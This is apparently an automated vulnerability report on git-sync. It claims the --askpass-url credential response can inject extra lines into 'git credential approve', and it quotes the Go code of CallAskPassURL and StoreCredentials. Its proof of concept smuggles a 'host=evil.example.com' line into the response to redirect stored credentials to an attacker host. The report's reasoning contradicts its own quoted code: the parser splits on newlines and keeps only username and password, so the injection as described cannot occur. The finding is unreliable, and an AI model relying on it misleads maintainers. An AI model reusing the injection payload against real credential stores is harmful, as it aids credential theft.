### Title
Unvalidated username/password from `--askpass-url` response enables git-credential-store injection - (File: main.go, function `CallAskPassURL`/`StoreCredentials`)

### Summary
`CallAskPassURL` fetches credentials from an operator-configured HTTP endpoint and passes the raw `username`/`password` values, without any validation or sanitization, into a hand-built `url=...\nusername=...\npassword=...\n` blob that is piped to `git credential approve` via `StoreCredentials`. Neither function checks that the values are free of newline characters or other credential-protocol metacharacters before building this blob.

### Finding Description
`CallAskPassURL` [1](#0-0)  parses the HTTP response body line-by-line as `key=value` pairs and extracts `username` and `password` fields with no validation of their contents. These values are then handed directly to `StoreCredentials`: [2](#0-1) 

`StoreCredentials` builds the credential-helper input via `fmt.Sprintf("url=%v\nusername=%v\npassword=%v\n", url, username, password)` and pipes it to `git credential approve`. Because `username` or `password` may itself contain `\n` characters (nothing strips or rejects them), a value returned by the askpass endpoint can inject additional `key=value` lines into the credential record that is stored by the `git-credential-store` (or whichever helper is configured), e.g. overriding `protocol`, `host`, or `path`, or appending extra fields that get persisted into the on-disk credential store. This mirrors the report's general theme of "insufficient validation of input parameters" — here, an external, less-trusted response body is trusted verbatim and concatenated into a structured protocol without escaping.

The same pattern also affects `RefreshGitHubAppToken`, which stores `password := tokenResponse.Token` obtained from a JSON HTTP response with no format validation before it is fed through the identical `StoreCredentials` path [3](#0-2) .

### Impact Explanation
An attacker who can influence the response of the configured `--askpass-url` service (e.g., a compromised or spoofed metadata/auth endpoint, or a man-in-the-middle if the URL is not on a secure/trusted channel) can inject extra `key=value` lines into the `git credential approve` stdin stream. This can corrupt or overwrite unrelated stored credential entries in the credential store used by git-sync's git process (e.g., altering the `host`/`path`/`protocol` scoping of a stored credential so it is later presented to a different, attacker-chosen host), or persist unexpected data into the credential store file. In the worst case this could redirect stored secrets to be sent to a host of the attacker's choosing on a subsequent git operation (credential disclosure to a rogue host), which falls under "credential or token disclosure."

This is a Medium-severity issue: it requires control of, or the ability to tamper with, the response of the operator-configured askpass endpoint (or a MITM against that channel), which is a narrower precondition than a fully unauthenticated remote attacker, but is a realistic reachable path since the askpass URL is explicitly designed to be queried over HTTP and the docs themselves warn "credentials will pass in plain text."

### Likelihood Explanation
Exploitability depends on the attacker being able to control or tamper with the HTTP response from the `--askpass-url` endpoint (e.g., DNS/network MITM on an insecure `http://` askpass URL, as shown in the project's own documentation example using plain `http://`), or compromising that service. Given git-sync's own docs recommend but do not enforce that the connection be secure, this is a plausible, not purely theoretical, scenario in typical Kubernetes sidecar deployments where the askpass URL often points to an in-cluster metadata service.

### Recommendation
- Validate `username` and `password` parsed from the askpass response (and the GitHub App token) to reject or strip embedded newline (`\n`, `\r`) characters before constructing the `git credential approve` input in `StoreCredentials`.
- Prefer building the credential-helper payload via a safe encoder rather than `fmt.Sprintf` string concatenation, or escape any control characters per the `git-credential` protocol.
- Enforce (or at least warn loudly/fail) when `--askpass-url` is not `https://`, since plaintext HTTP transport makes response tampering trivial.

### Proof of Concept
1. Configure git-sync with `--askpass-url=http://attacker-controlled-or-mitm-host/git_askpass`.
2. Have the askpass HTTP server return a body such as:
   ```
   username=alice
   password=secret
   host=evil.example.com
   ```
   (or embed `\n` inside the `password=` value itself, e.g. `password=secret\nhost=evil.example.com`, depending on how the attacker can control the raw bytes returned).
3. `CallAskPassURL` parses each line independently and passes `username`/`password` to `StoreCredentials` [4](#0-3) , which constructs `url=<repo>\nusername=alice\npassword=secret\nhost=evil.example.com\n` and pipes it to `git credential approve`.
4. The extra injected line alters the scope of the stored credential record, which can cause git to later present the previously-appropriate credentials to `evil.example.com` on a subsequent fetch, exfiltrating them.

Note: I was not able to inspect `pkg/cmd/cmd.go`'s `RunWithStdin` implementation or the exact git-credential-store backend behavior in this index, so the precise on-disk consequences of the injected line depend on the configured credential helper; this should be verified against the actual `git credential approve` semantics for the deployed helper (e.g., `store`, `cache`) in a live environment.

```go
	git.log.V(1).Info("storing git credential", "url", redactURL(url))
	git.log.V(9).Info("md5 of credential", "url", url, "username", md5sum(username), "password", md5sum(password))

	creds := fmt.Sprintf("url=%v\nusername=%v\npassword=%v\n", url, username, password)
	_, _, err := git.RunWithStdin(ctx, "", creds, "credential", "approve")
	if err != nil {
		return fmt.Errorf("can't configure git credentials: %w", err)
	}
```

```go
func (git *repoSync) CallAskPassURL(ctx context.Context) error {
	git.log.V(3).Info("calling auth URL to get credentials")

	var netClient = &http.Client{
		Timeout: time.Second * 1,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	httpReq, err := http.NewRequestWithContext(ctx, http.MethodGet, git.authURL, nil)
	if err != nil {
		return fmt.Errorf("can't create auth request: %w", err)
	}
	resp, err := netClient.Do(httpReq)
	if err != nil {
		return fmt.Errorf("can't access auth URL: %w", err)
	}
	defer func() {
		_ = resp.Body.Close()
	}()
	if resp.StatusCode != http.StatusOK {
		errMessage, err := io.ReadAll(resp.Body)
		if err != nil {
			return fmt.Errorf("auth URL returned status %d, failed to read body: %w", resp.StatusCode, err)
		}
		return fmt.Errorf("auth URL returned status %d, body: %q", resp.StatusCode, string(errMessage))
	}
	authData, err := io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("can't read auth response: %w", err)
	}

	username := ""
	password := ""
	for line := range strings.SplitSeq(string(authData), "\n") {
		keyValues := strings.SplitN(line, "=", 2)
		if len(keyValues) != 2 {
			continue
		}
		switch keyValues[0] {
		case "username":
			username = keyValues[1]
		case "password":
			password = keyValues[1]
		}
	}

	if err := git.StoreCredentials(ctx, git.repo, username, password); err != nil {
		return err
	}
```
